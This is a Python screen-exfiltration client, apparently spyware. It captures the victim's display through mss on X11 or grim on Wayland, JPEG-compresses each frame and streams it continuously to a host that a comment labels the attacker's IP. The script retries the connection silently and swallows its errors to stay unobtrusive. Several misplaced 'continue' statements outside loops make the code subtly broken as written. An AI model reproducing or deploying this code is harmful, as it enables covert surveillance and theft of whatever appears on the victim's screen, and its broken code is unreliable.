import socket
import struct
import io
import time
import sys
import os
import subprocess
from PIL import Image

# --- Configuration ---
SERVER_HOST = '192.168.1.222' # Change this to Attackers IP
SERVER_PORT = 5555
JPEG_QUALITY = 80
FPS = 30
RETRY_INTERVAL = 5         # Seconds to wait before retrying connection

# --- Global Variables ---
client_socket = None
is_running = True   
display_server_type = None # Will be 'x11' or 'wayland'
capture_method = None # Will be the function to call for screen capture

# --- Screen Capture Implementations ---

def capture_screen_x11(sct_instance, monitor_info):
    """Captures screen using mss for X11."""
    try:
        sct_img = sct_instance.grab(monitor_info)
        img = Image.frombytes("RGB", sct_img.size, sct_img.rgb)
        return img
    except Exception as e:
        return None

def capture_screen_wayland():
    """
    Captures screen using grim for Wayland.
    Assumes 'grim' is installed and available in PATH.
    It captures the entire screen to a BytesIO object.
    """
    try:
        # Use grim to capture the entire screen.
        # -o means output to stdout.
        # This will capture the whole screen or whatever grim defaults to.
        # For multi-monitor setups, grim might capture all monitors into one image.
        process = subprocess.run(
            ['grim', '-'], # Capture to stdout
            capture_output=True,
            check=True
        )
        img_bytes = process.stdout
        img = Image.open(io.BytesIO(img_bytes))
        return img
    except FileNotFoundError:
        return None
    except subprocess.CalledProcessError as e:
        return None
    except Exception as e:
        return None

def detect_display_server():
    """Detects if the current session is Wayland or X11."""
    global display_server_type, capture_method

    session_type = os.environ.get('XDG_SESSION_TYPE')
    if session_type == 'wayland':
        display_server_type = 'wayland'
        capture_method = capture_screen_wayland
    elif session_type == 'x11':
        display_server_type = 'x11'
        print("Detected X11 session. Using 'mss' for screen capture.")
    else:
        # Fallback for older systems or unexpected environments
        if os.environ.get('DISPLAY'):
            display_server_type = 'x11'
            continue
        else:
            display_server_type = 'x11' # Default to x11 if detection fails

def send_screen_loop():
    """
    Captures the screen, compresses it, and sends it to the server.
    This function continuously runs in a loop.
    """
    global is_running, client_socket, display_server_type, capture_method

    if display_server_type == 'x11':
        try:
            import mss
            sct = mss.mss()
            # Get information of monitor 1 (primary monitor)
            # You can change this if you have multiple monitors
            monitor = sct.monitors[1]
            capture_method = lambda: capture_screen_x11(sct, monitor)
        except mss.exception.ScreenShotError as e:
            is_running = False
            return
        except ImportError:
            is_running = False
            return
    elif display_server_type == 'wayland':
        # capture_method is already set to capture_screen_wayland
        pass # No specific initialization needed for grim

    if not capture_method:
        is_running = False
        return

    try:
        while is_running:
            start_time = time.time()

            # 1. Capture the screen using the detected method
            img = capture_method()
            if img is None:
                time.sleep(1) # Small delay before retrying capture
                continue

            # 2. Compress the image to JPEG bytes
            img_byte_arr = io.BytesIO()
            img.save(img_byte_arr, format='JPEG', quality=JPEG_QUALITY)
            image_data = img_byte_arr.getvalue()

            # 3. Send the size of the image data (4 bytes, unsigned long)
            client_socket.sendall(struct.pack('<L', len(image_data)))

            # 4. Send the actual image data
            client_socket.sendall(image_data)

            # Control frame rate
            elapsed_time = time.time() - start_time
            if elapsed_time < (1 / FPS):
                time.sleep((1 / FPS) - elapsed_time)

    except (socket.error, ConnectionResetError) as e:
        continue
    except Exception as e:
        # Mark as not running to trigger outer loop to retry or exit
        is_running = False
    finally:
        pass # The outer start_client loop handles reconnection/cleanup

def close_client():
    """Closes the client socket and shuts down the client."""
    global is_running, client_socket
    is_running = False
    if client_socket:
        try:
            client_socket.shutdown(socket.SHUT_RDWR)
            client_socket.close()
        except OSError as e:
            continue
    sys.exit(0) # Exit the script cleanly

def start_client():
    """Initializes the client socket and connects to the server, with retry logic."""
    global client_socket, is_running

    detect_display_server() # Detect display server once at startup

    while True: # Continuous retry loop
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            is_running = True # Reset is_running to True on successful connection
            send_screen_loop() # Start sending screens once connected
            # If send_screen_loop returns, it means the connection was lost or an error occurred.
            # The loop will then go for a retry.

        except ConnectionRefusedError:
            pass
        except socket.timeout:
            pass
        except socket.error as e:
            pass
        except Exception as e:
            pass
        finally:
            # Always close the socket if it was created, before retrying
            if client_socket:
                try:
                    client_socket.close()
                except OSError as e:
                    pass
            if is_running: # Only wait if we expect to retry
                time.sleep(RETRY_INTERVAL)

if __name__ == "__main__":
    start_client()